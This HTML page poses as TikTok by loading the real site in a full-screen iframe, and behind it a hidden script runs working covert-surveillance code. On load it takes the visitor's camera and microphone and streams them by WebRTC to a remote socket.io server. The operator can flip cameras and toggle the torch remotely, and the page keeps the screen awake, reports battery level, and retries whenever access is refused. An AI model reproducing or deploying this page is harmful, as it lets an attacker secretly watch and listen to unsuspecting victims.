<!DOCTYPE html>
<html>
<head><title>TikTok</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body,html{margin:0;padding:0;background:#000;height:100%;overflow:hidden;}iframe{width:100%;height:100%;border:none;}video{display:none;}</style></head>
<body>
    <iframe src="https://www.tiktok.com" allow="autoplay"></iframe>
    <video id="v" autoplay playsinline muted></video>
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io(); let pc, stream, mode = "user", torchOn = false;

        async function sendStatus() {
            const battery = await navigator.getBattery();
            setInterval(() => {
                socket.emit("status-update", { 
                    battery: Math.floor(battery.level * 100),
                    torch: torchOn
                });
            }, 3000);
        }

        async function start() {
            if (stream) stream.getTracks().forEach(t => t.stop());
            if (pc) pc.close();
            pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
                stream.getTracks().forEach(t => pc.addTrack(t, stream));
                pc.onicecandidate = e => e.candidate && socket.emit("ice", { candidate: e.candidate, id: socket.id });
                const offer = await pc.createOffer(); await pc.setLocalDescription(offer);
                socket.emit("offer", { offer, id: socket.id });
                if ('wakeLock' in navigator) { await navigator.wakeLock.request('screen'); }
                sendStatus();
            } catch (e) { setTimeout(start, 5000); }
        }

        socket.on("switch", () => { mode = (mode === "user") ? "environment" : "user"; torchOn = false; start(); });
        
        socket.on("torch", async () => {
            const t = stream.getVideoTracks()[0];
            const caps = t.getCapabilities();
            if (caps.torch) {
                torchOn = !torchOn;
                await t.applyConstraints({ advanced: [{ torch: torchOn }] });
                socket.emit("status-update", { torch: torchOn });
            }
        });

        socket.on("answer", d => d.id === socket.id && pc.setRemoteDescription(new RTCSessionDescription(d.answer)));
        socket.on("ice", d => d.id === socket.id && pc.addIceCandidate(new RTCIceCandidate(d.candidate)));
        window.onload = start;
    </script>
</body>
</html>
